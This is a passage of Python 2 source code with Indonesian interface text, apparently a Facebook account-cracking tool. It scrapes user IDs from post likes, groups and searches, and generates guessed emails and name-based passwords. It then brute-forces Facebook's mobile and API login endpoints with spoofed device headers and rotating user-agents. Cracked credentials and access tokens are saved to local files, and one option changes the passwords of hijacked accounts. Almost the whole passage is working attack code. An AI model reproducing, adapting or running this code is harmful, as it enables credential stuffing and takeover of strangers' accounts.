    except IOError:
        print m + '\n [x] Token Error'
        exit()
    except:
        pass


try:
    pos = jk.replace(jk, '')
except:
    pass

try:
    _sessi = y
except:
    pass

c = 1

def likez(token, id_like):
    global ttl__
    ttl__ = []
    url_like = ('https://graph.facebook.com/{}/likes?limit=100000&access_token={}').format(id_like, token)
    with requests.Session() as (iqbal):
        hal_like = iqbal.get(url_like).json()
        if len(hal_like['data']) == 0:
            print m + '\n Tidak Bisa Mengakses Data..'
            exit()
        for dev in hal_like['data']:
            try:
                t = te.replace(te, '')
                sys.stdout.write(h + '\r [' + k + '$' + h + ']' + p + ' Mengambil User ID' + a + t + ': ' + str(len(user_id)))
                if y != z:
                    break
                try:
                    user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                except:
                    pass

            except:
                pass


def likezzzzzzz(cookie, id_like):
    c = 1
    URL = 'https://graph.facebook.com/' + idt + '/likes?limit=100000&access_token='
    url_like = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=3000&total_count=282&ft_ent_identifier={}').format(id_like)
    with requests.Session() as (ses_dev):
        hal_like = ses_dev.get(url_like, cookies=cookie).content
        sop_dev = BeautifulSoup(hal_like, 'html.parser')
    if 'Orang yang menanggapi' not in str(hal_like):
        print '\n Maaf ID Tidak bisa dijangkau,\n Silahkan Masukkan ID Postingan yg Lain\n'
        likez()
    react = sop_dev.find_all('h3')
    for dev in react:
        for uwu in dev.find_all('a'):
            try:
                nama = uwu.text
                user = uwu['href'].replace('profile.php?id=', '').strip('/&?')
                t = te.replace(te, '')
                sys.stdout.write(h + '\r [' + k + '$' + h + ']' + p + ' Mengambil User ID' + a + t + ': ' + str(c))
                if y != z:
                    break
                try:
                    user_id.append(str(user) + ' ' + str(nama))
                except:
                    pass

                c += 1
            except UnicodeEncodeError:
                continue
            except:
                pass


c = 1
count = 0

def cari_orang(jumlah, u_orang, cookie):
    global c
    global data_user
    global token
    while jumlah > c:
        with requests.Session() as (ses_dev):
            hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode('utf-8')
            sop_dev = BeautifulSoup(hal_orang, 'html.parser')
            cari = sop_dev.find_all('tbody')
            for dev in cari:
                try:
                    d = dev.find('a', class_=True)['href']
                    if 'add_friend' in d:
                        t = te.replace(te, '')
                        id_dev = d.replace('/a/mobile/friends/add_friend.php?id=', '').replace('&', ' ')
                        us_ = id_dev.split()[0]
                        if y != z:
                            break
                        try:
                            data_user.append(str(us_))
                        except:
                            pass

                        c += 1
                        if len(user_id) == jumlah + 1:
                            break
                    else:
                        continue
                except:
                    continue

            if len(cari_teman) == 1:
                if len(data_user) == 0:
                    print m + '\n Tidak ada daftar Orang yg Di temukan...\n'
                    break
                teman_teman_(token, data_user)
         #       sandi_dev()
                __pilih_crack__()
                print '\n', garis, p + 'Done...'
                exit()
            with ThreadPoolExecutor(max_workers=30) as (dev_x):
                dev_x.map(__get_data_user__, data_user)
                data_user = []
            if 'Lihat Hasil Selanjutnya' in str(hal_orang):
                dev = sop_dev.find('a', string='Lihat Hasil Selanjutnya')
                u_orang = dev['href']
                cari_orang(jumlah, u_orang, cookie)
            with ThreadPoolExecutor(max_workers=30) as (dev_x):
                dev_x.map(__get_data_user__, data_user)
                data_user = []


id_grup = []

def my_grup(token):
    url = ('https://graph.facebook.com/me/groups?access_token={}').format(token)
    with requests.Session() as (ses_):
        data = ses_.get(url).json()
        for dev in data['data']:
            try:
                print h + ' [' + p + '*' + h + ']' + p + ' Nama Grup' + h + ': ' + dev['name'].encode('utf-8')
                print h + ' [' + p + '*' + h + ']' + p + ' ID Grup' + k + ': ' + dev['id']
                print ''
                t = te.replace(te, '')
                id_grup.append(dev['id'])
                if y != z:
                    break
            except:
                pass

    print garis
    for dev in id_grup:
        try:
            url_grup = ('https://mbasic.facebook.com/browse/group/members/?id={}').format(dev)
            grup(cookie, url_grup)
        except KeyboardInterrupt:
            break


def grup(cookie, url_grup):
    with requests.Session() as (ses_):
        try:
            data = ses_.get(url_grup, cookies=cookie, headers=header).content
            sop_dev = BeautifulSoup(data, 'html.parser')
            members = sop_dev.find('div', id='objects_container')
            for dev in members.find_all('table'):
                user_ = dev['id'].replace('member_', '')
                nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                try:
                    data_user.append(str(user_) + ' ' + str(nama_))
                except:
                    pass

                print h + '\r [' + p + '*' + h + ']' + p + ' Mengambil 100+ ID Per Grup' + k + ': ' + str(len(data_user)),
                sys.stdout.flush()

            if 'Lihat Selengkapnya' in str(sop_dev):
                url = sop_dev.find('a', string='Lihat Selengkapnya')['href']
                url_grup = 'https://mbasic.facebook.com' + url
                grup(cookie, url_grup)
        except:
            pass


import time, re, requests, sys, random, subprocess, datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import datetime
from datetime import date

def pencarian_pro():
    global ttl__
    ttl__ = []
    nama = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Cari Orang' + h + ': ')
    while True:
        try:
            if y != z:
                break
            print h + '\n [' + k + '1' + h + ']' + p + ' @email.com' + a + ' Pro'
            print h + ' [' + k + '2' + h + ']' + p + ' @gmail.com'
            print h + ' [' + k + '3' + h + ']' + p + ' @yahoo.com'
            print garis
            pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Pilih Domain' + h + ': ')
            if pil == '1':
                domain = '@email.com'
                break
            elif pil == '2':
                domain = '@gmail.com'
                break
            elif pil == '3':
                domain = '@yahoo.com'
                break
        except:
            break

    jml = input(h + ' [' + p + '$' + h + ']' + p + ' Masukkan Jumlah' + k + ': ' + p)
    nam = nama.split()
    if len(nam) == 2:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1])))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 3:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1] + nam[2]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1] + ' ' + str(nam[2]))))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) > 3:
        pw = nama.split()
        nam = nama.replace(' ', '')
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam) + str(dev) + domain + ' ' + str(pw[0]))
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 1:
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(nama + str(dev) + domain + ' ' + nama)
                print '\r [' + p + '$' + h + ']' + p + ' Mengambil' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass


def __cp__(eml_dev, san_dev):
    wak = datetime.datetime.now()
    waktu = str(wak.year) + '-' + str(wak.month) + '-' + str(wak.day)
    data = h + '\r{' + k + 'Chek' + h + '}' + p + (' {:<15}\x1b[92;1m | \x1b[90;1m{}   ').format(eml_dev, san_dev)
    if len(sesi) != 0:
        eml_dev = eml_dev + '>>>'
        cek_dev(eml_dev, san_dev, data)
    else:
        print data
    eml_dev = eml_dev.replace('>>>', '')
    with open('hasil_cp.txt', 'a') as (hasil):
        di = open('hasil_cp.txt', 'r').read()
        if eml_dev in di:
            has = di.replace(eml_dev, eml_dev).replace(san_dev, san_dev)
            with open('hasil_cp.txt', 'w') as (tulis):
                tulis.write(has)
        else:
            hasil.write('[' + waktu + ']==>' + eml_dev + '==>|==>' + san_dev + '\n')
    hasil_cp.append(eml_dev)


def __ttl__cp_(eml_dev, ttl, san_dev):
    try:
        wak = datetime.datetime.now()
        waktu = str(wak.year) + '-' + str(wak.month) + '-' + str(wak.day)
        data = h + '\r{' + k + 'Chek' + h + '}' + p + (' {:<15}\x1b[92;1m | \x1b[96;1m{}\x1b[92;1m | \x1b[97;1m{}   ').format(eml_dev, san_dev, ttl)
        if len(sesi) != 0:
            eml_dev = eml_dev + '>>>'
            cek_dev(eml_dev, san_dev, data)
        else:
            print data
        eml_dev = eml_dev.replace('>>>', '')
        with open('hasil_cp.txt', 'a') as (hasil):
            di = open('hasil_cp.txt', 'r').read()
            if eml_dev in di:
                has = di.replace(eml_dev, eml_dev).replace(san_dev, san_dev)
                with open('hasil_cp.txt', 'w') as (tulis):
                    tulis.write(has)
            else:
                hasil.write('[' + waktu + ']==>' + eml_dev + '==>|==>' + san_dev + '==>|==>' + ttl + '\n')
        hasil_cp.append(eml_dev)
    except:
        pass


user_agent = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'

def crack_dev_api(iqbal_, dev___):
    global count_
    global user_agent
    ua = y[0]
    tampil = a + ('>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mLive\x1b[96;1m/\x1b[93;1mCek:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp))
    print '\r' + tampil,
    sys.stdout.flush()
    count_ += 1
    eml_dev = iqbal_
    w = te[0]
    if 2 == len(eml_dev):
        eml_dev = eml_dev[0]
        ttl = iqbal_[1]
    for san_ in dev___:
        try:
            san_dev = san_.lower()
            user_agent = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            if len(ua_hp) != 0:
                user_agent = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                 '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                 '[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                 'Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'])
            header = {'user-agent': user_agent, 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            response = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(eml_dev) + '&password=' + str(san_dev) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true' + pos, headers=header)
            if 'session_key' in response.text and 'EAAA' in response.text:
                if eml_dev in hasil_ok:
                    pass
                else:
                    print a + '\r{' + p + 'Live' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{} \x1b[96;1mLogin Di FB Lite ').format(eml_dev, san_dev)
                    with open('hasil_ok.txt', 'a') as (hasil):
                        hasil.write('[Live] ' + eml_dev + ' | ' + san_dev + '\n')
                    hasil_ok.append(eml_dev)
                    token = response.json()['access_token']
                    print a + '\r{' + p + 'Tokn' + a + '}' + k + ' AccessToken: ' + h + token + '\n'
                    with open('akun_tumbal.txt', 'a') as (tumbal):
                        tumbal.write(token + '\n')
                    cokiz = response.json()['session_cookies']
                    break
            elif 'www.facebook.com' in response.json()['error_msg']:
                id_ = response.json()
                f = id_['error_data'].encode('utf-8')
                eml_dev = re.findall('"uid":(.*),"show_native_checkpoints"', f)[0]
                if len(iqbal_) == 2:
                    if eml_dev in hasil_cp:
                        pass
                    else:
                        __ttl__cp_(eml_dev, ttl, san_dev)
                        break
                elif eml_dev in hasil_cp:
                    pass
                else:
                    __cp__(eml_dev, san_dev)
                    break
        except:
            count_ -= 1
            dev_san = san_dev.split()
            crack_dev_api(iqbal_, dev_san)


def crack_dev(iqbal_, dev___):
    global count_
    global user_agent
    eml_dev = iqbal_
    print a + ('\r>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mLive\x1b[96;1m/\x1b[93;1mCek:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp)),
    sys.stdout.flush()
    count_ += 1
    ua = te[0]
    if 2 == len(eml_dev):
        eml_dev = eml_dev[0]
        ttl = iqbal_[1]
    for san_ in dev___:
        try:
            san_dev = san_.lower()
            url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
            if 'IqbalDev' in log_ml_dev:
                url_page_log = __ml_dev__
            if 'IqbalDev' in log_ff_dev:
                url_page_log = __ff_dev__
            with requests.Session() as (ses_dev):
                page_dev = ses_dev.get(url_page_log).content
                sop = BeautifulSoup(page_dev, 'html.parser')
                form_dev = sop.find('form', id='login_form')
                url_post = form_dev['action']
                waktu = time.time()
                if len(ua_hp) == 0:
                    user_agent = open('ua_dev.txt', 'r').read()
                else:
                    user_agent = random.choice(user_agent_dev)
                payload = {}
                pay_dev = {}
                for dev in form_dev:
                    input = dev
                    try:
                        payload[input.get('name')] = input.get('value')
                    except:
                        pass

                pay_dev.update({'lsd': str(payload['lsd']), 
                   'm_ts': str(payload['m_ts']), 
                   'jazoest': str(payload['jazoest']), 
                   'li': str(payload['li']), 
                   'try_number': str(payload['try_number']), 
                   'unrecognized_tries': str(payload['unrecognized_tries']), 
                   'bi_xrwh': str(payload['bi_xrwh']), 
                   'prefill_contact_point': str(eml_dev), 
                   'prefill_source': 'provided_or_soft_matched', 
                   'prefill_type': 'contact_point', 
                   'first_prefill_source': 'browser_dropdown', 
                   'first_prefill_type': 'contact_point', 
                   'had_cp_prefilled': False, 
                   'had_password_prefilled': False, 
                   'is_smart_lock': False, 
                   'bi_wvdp': {'hwc': True, 'hwcr': True, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True, 'iframeProto': 'function get contentWindow() { [native code] }', 'remap': False, 'iframeData': {'hwc': True, 'hwcr': False, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True}}, 'email': str(eml_dev), 
                   'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev)), 
                   'bi_xrwh': '0', 
                   '__dyn': '', 
                   '__csr': '', 
                   '__req': 'e', 
                   '__a': '', 
                   '__user': '0'})
                ses_dev.headers.update({'user-agent': user_agent, 
                   'referer': fb + url_post, 
                   'Host': 'm.facebook.com', 
                   'accept': '*/*', 
                   'sec-ch-ua-mobile': '?1', 
                   'accept-encoding': 'gzip, deflate, br', 
                   'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
                   'x-fb-lsd': str(payload['lsd']), 
                   'content-length': str(random.randint(1000, 5000)), 
                   'content-type': 'application/x-www-form-urlencoded'})
                pay_ = {'email': str(eml_dev), 'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev))}
                login_dev = ses_dev.post(fb + pos + url_post, data=pay_dev, allow_redirects=False).cookies
                cookie = login_dev.get_dict()
                if len(login_dev.get_dict()) == 0:
                    login_dev = ses_dev.post(fb + url_post, data=pay_, allow_redirects=False).cookies
                if 'c_user' in login_dev:
                    if eml_dev in hasil_ok:
                        pass
                    else:
                        print a + '\r{' + p + 'Live' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{}').format(eml_dev, san_dev)
                        with open('hasil_ok.txt', 'a') as (hasil):
                            hasil.write('[Live] ' + eml_dev + ' | ' + san_dev + '\n')
                        hasil_ok.append(eml_dev)
                        break
                elif 'checkpoint' in login_dev:
                    eml_dev = login_dev.get_dict()['checkpoint'].split('%')[4].replace('3A', '')
                    if len(iqbal_) == 2:
                        if eml_dev in hasil_cp:
                            pass
                        else:
                            __ttl__cp_(eml_dev, ttl, san_dev)
                            break
                    elif eml_dev in hasil_cp:
                        pass
                    else:
                        __cp__(eml_dev, san_dev)
                        break
        except:
            count_ -= 1
            dev_san = san_dev.split()
            crack_dev(iqbal_, dev_san)


def crack_mobile(iqbal_, dev__):
    global count_
    global user_agent
    try:
        eml_dev = iqbal_
        print a + ('\r>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mLive\x1b[96;1m/\x1b[93;1mCek:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp)),
        sys.stdout.flush()
        count_ += 1
        ua = te[0]
        if 2 == len(eml_dev):
            eml_dev = eml_dev[0]
            ttl = iqbal_[1]
        for san__ in dev__:
            san_dev = san__.lower()
            url = 'https://m.facebook.com/login/?ref=dbl&fl'
            with requests.Session() as (ses_dev):
                if 'IqbalDev' in log_mbasic_dev:
                    url = 'https://mbasic.facebook.com/login/?ref=dbl&fl'
                if 'IqbalDev' in log_free_dev:
                    url = 'https://free.facebook.com/login.php'
                halaman = ses_dev.get(url).content
                sop = BeautifulSoup(halaman, 'html.parser')
                form = sop.find('form', id='login_form')
                url_post = form['action']
                wkt_dev = time.time()
                payload = {}
                pay_dev = {}
                for dev in form:
                    input = dev
                    try:
                        payload[input.get('name')] = input.get('value')
                    except:
                        pass

                pay_dev = {'lsd': str(payload['lsd']), 
                   'm_ts': str(payload['m_ts']), 
                   'jazoest': str(payload['jazoest']), 
                   'li': str(payload['li']), 
                   'try_number': str(payload['try_number']), 
                   'unrecognized_tries': str(payload['unrecognized_tries']), 
                   'bi_xrwh': str(payload['bi_xrwh']), 
                   'prefill_contact_point': str(eml_dev), 
                   'prefill_source': 'provided_or_soft_matched', 
                   'prefill_type': 'contact_point', 
                   'first_prefill_source': 'browser_dropdown', 
                   'first_prefill_type': 'contact_point', 
                   'had_cp_prefilled': False, 
                   'had_password_prefilled': False, 
                   'is_smart_lock': False, 
                   'bi_wvdp': {'hwc': True, 'hwcr': True, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True, 'iframeProto': 'function get contentWindow() { [native code] }', 'remap': False, 'iframeData': {'hwc': True, 'hwcr': False, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True}}, 'email': str(eml_dev), 
                   'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev)), 
                   'bi_xrwh': '0', 
                   '__dyn': '', 
                   '__csr': '', 
                   '__req': 'e', 
                   '__a': '', 
                   '__user': '0'}
                if 'IqbalDev' in log_mbasic_dev or 'IqbalDev' in log_free_dev:
                    payload = {}
                    for dev in form:
                        input = dev
                        try:
                            payload[input.get('name')] = input.get('value')
                        except:
                            pass

                    pay_dev = {'lsd': str(payload['lsd']), 
                       'jazoest': str(payload['jazoest']), 
                       'm_ts': str(payload['m_ts']), 
                       'li': str(payload['li']), 
                       'try_number': str(payload['try_number']), 
                       'unrecognized_tries': str(payload['unrecognized_tries']), 
                       'email': str(eml_dev), 
                       'pass': str(san_dev), 
                       'bi_xrwh': str(payload['bi_xrwh'])}
                url_post_ = 'https://m.facebook.com'
                host = 'm.facebook.com'
                if 'IqbalDev' in log_mbasic_dev:
                    url_post_ = 'https://mbasic.facebook.com'
                    host = 'mbasic.facebook.com'
                if 'IqbalDev' in log_free_dev:
                    url_post_ = 'https://free.facebook.com'
                    host = 'free.facebook.com'
                user_agent = random.choice(user_agent_dev)
                header_mobile = {'Host': host, 
                   'user-agent': user_agent, 
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                   'accept-encoding': 'gzip, deflate, br', 
                   'accept-language': 'id', 
                   'cache-control': 'max-age=0', 
                   'content-length': str(random.randint(100, 200)), 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'origin': url_post_, 
                   'referer': url, 
                   'sec-ch-ua-mobile': '?0', 
                   'sec-fetch-dest': 'document', 
                   'sec-fetch-mode': 'navigate', 
                   'sec-fetch-site': 'same-origin'}
                if len(ua_hp) == 0:
                    user_agent = open('ua_dev.txt', 'r').read()
                    header_mobile = {'Host': host, 
                       'user-agent': user_agent, 
                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                       'accept-encoding': 'gzip, deflate, br', 
                       'accept-language': 'id', 
                       'cache-control': 'max-age=0', 
                       'content-length': str(random.randint(100, 200)), 
                       'content-type': 'application/x-www-form-urlencoded', 
                       'origin': url_post_, 
                       'referer': url, 
                       'sec-ch-ua-mobile': '?0', 
                       'sec-fetch-dest': 'document', 
                       'sec-fetch-mode': 'navigate', 
                       'sec-fetch-site': 'same-origin'}
                login = ses_dev.post(url_post_ + pos + url_post, data=pay_dev, headers=header_mobile)
                log = login.cookies
                login_dev = log.get_dict()
                if 'c_user' in login_dev or 'checkpointSecondaryButton' in login.text:
                    if eml_dev in hasil_ok:
                        pass
                    else:
                        print a + '\r{' + p + 'Live' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{}').format(eml_dev, san_dev)
                        with open('hasil_ok.txt', 'a') as (hasil):
                            hasil.write('[Live] ' + eml_dev + ' | ' + san_dev + '\n')
                        hasil_ok.append(eml_dev)
                        break
                elif 'checkpoint' in login_dev:
                    eml_dev = log.get_dict()['checkpoint'].split('%')[4].replace('3A', '')
                    if len(iqbal_) == 2:
                        if eml_dev in hasil_cp:
                            pass
                        else:
                            __ttl__cp_(eml_dev, ttl, san_dev)
                            break
                    elif eml_dev in hasil_cp:
                        pass
                    else:
                        __cp__(eml_dev, san_dev)
                        break
                else:
                    continue

    except:
        count_ -= 1
        dev_san = san_dev.split()
        crack_mobile(iqbal_, dev_san)


tap_yes = []

def seting_pw_tap_yes():
    global pw_new
    global tap_yes
    tap_yes.append('Dev')
    while True:
        print garis
        pil_pw = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Ubah Sandi Akun' + a + ' Tap Yes' + k + ' [y/n]' + h + ': ')
        if pil_pw == 'y' or pil_pw == 'Y':
            pw_tap.append('IqbalDev')
            break
        elif 'n' == pil_pw or 'N' == pil_pw:
            pw_new = ''
            break

    if len(pw_tap) != 0:
        while True:
            print garis
            print h + ' [' + p + '@' + h + ']' + p + ' Contoh: ' + k + 'anjing'
            pw_new = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Masukkan sandi untuk ubah sandi Akun' + a + ' Tap Yes' + h + ': ')
            if len(pw_new) < 6:
                print m + ' Minimal 6 Karakter..'
            else:
                break


san_manual = []
gak_gabung = []
sandi_gabung = []
angka_nama = []
pilih = []
san_ttl = []
pw_tap = []

def sandi_dev():
    global pw_new
    print h + '\n [' + p + '@' + h + ']' + p + ' Contoh Sandi Manual: ' + k + 'anjing,kintil,ganteng'
    san = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Input Sandi Manual?' + d + 'ENTER>Skip' + h + ': ')
    sandi_bawaan_koma = 'name123,name12345'
    sandi_bawaan_spasi = 'name123 name12345'
    while True:
        print h + '\n [' + p + '@' + h + ']' + p + ' Contoh: ' + k + '123,1234,12345'
        angka = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Tambahkan Angka Dibelakang Nama' + h + ': ')
        if len(angka) != 0:
            angka_ = angka.split(',')
            for dev in angka_:
                angka_nama.append(dev)

            break

    while True:
        print garis
        print h + ' [' + k + '1' + h + ']' + p + ' FirstName+LastName FullName'
        print h + ' [' + k + '2' + h + ']' + p,
        for dev in angka_nama:
            print 'FirstName' + k + dev,

        print 'FullName'
        print h + ' [' + k + '3' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName FullName'
        print h + ' [' + k + '4' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName' + k + dev,

        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName FullName'
        print garis
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Pilih Kombinasi Sandi' + h + ': ')
        if pil == '1':
            pilih.append('1')
            break
        elif pil == '2':
            pilih.append('2')
            break
        elif pil == '3':
            pilih.append('3')
            break
        elif pil == '4':
            pilih.append('4')
            break

    if len(ttl__) != 0:
        while True:
            print garis
            pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Tambahkan Sandi TTL?' + a + '[y/n]' + h + ': ')
            if 'y' in pil or 'Y' in pil:
                san_ttl.append('Dev')
                break
            elif 'n' in pil or 'N' in pil:
                break

    while True:
        print garis
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Munculkan ' + k + 'OPSI SESI ?' + a + '[y/n]' + h + ': ')
        if 'y' in pil or 'Y' in pil:
            sesi.append('Dev')
            break
        elif 'n' in pil or 'N' in pil:
            break

    if len(sesi) != 0:
        while True:
            print garis
            pil_pw = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Ubah Sandi Akun' + a + ' Tap Yes' + k + ' [y/n]' + h + ': ')
            if pil_pw == 'y' or pil_pw == 'Y':
                pw_tap.append('IqbalDev')
                break
            elif 'n' == pil_pw or 'N' == pil_pw:
                pw_new = ''
                break

    if len(pw_tap) != 0:
        while True:
            print garis
            print h + ' [' + p + '@' + h + ']' + p + ' Contoh: ' + k + 'anjing'
            pw_new = raw_input(h + ' [' + p + '?' + h + ']' + p + 'Masukkan Sandi untuk ubah Sandi Akun' + a + ' Tap Yes' + h + ': ')
            if len(pw_new) < 6:
                print m + ' Minimal 6 Karakter..'
            else:
                break

    if ',' in san:
        san_ = san.split(',')
        tampak = sandi_bawaan_koma + ',' + san
    else:
